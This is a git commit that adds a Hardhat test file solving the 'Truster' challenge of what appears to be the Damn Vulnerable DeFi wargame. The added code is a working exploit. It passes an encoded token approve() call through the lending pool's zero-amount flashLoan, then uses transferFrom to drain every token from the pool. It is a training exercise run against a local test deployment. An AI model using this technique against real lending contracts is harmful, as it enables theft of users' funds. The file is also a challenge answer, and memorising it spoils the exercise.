04dde7fe2e6c02556d88e18266368c7a888fe9fb
praise03 <praiseadedokun.pa@gmail.com>
2023-08-22 23:03:29 +0100

    challenge 3

---
+++ test/truster/truster.challenge.js
@@ -0,0 +1,69 @@
+const { ethers } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] Truster', function () {
+    let deployer, player;
+    let token, pool;
+
+    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, player] = await ethers.getSigners();
+
+        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
+        expect(await pool.token()).to.eq(token.address);
+
+        await token.transfer(pool.address, TOKENS_IN_POOL);
+        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
+
+        expect(await token.balanceOf(player.address)).to.equal(0);
+    });
+
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        
+        let sample_token_approve_abi = [
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "approve",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ]
+        let iface = new ethers.utils.Interface(sample_token_approve_abi);
+        // generate calldata to that approves our player address to transfer TOKENS_IN_POOL amount of tokens on its behalf;
+        const data = await iface.encodeFunctionData("approve", [ player.address, ethers.utils.parseEther("1000000") ])
+        
+        //target.functionCall(data); in pool contract allows us to call token.approve(player, amount);
+        await pool.connect(player).flashLoan(0, player.address, token.address, data);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
+        
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+        // Player has taken all tokens from the pool
+        expect(
+            await token.balanceOf(player.address)
+        ).to.equal(TOKENS_IN_POOL);
+        expect(
+            await token.balanceOf(pool.address)
+        ).to.equal(0);
+    });
+});
+
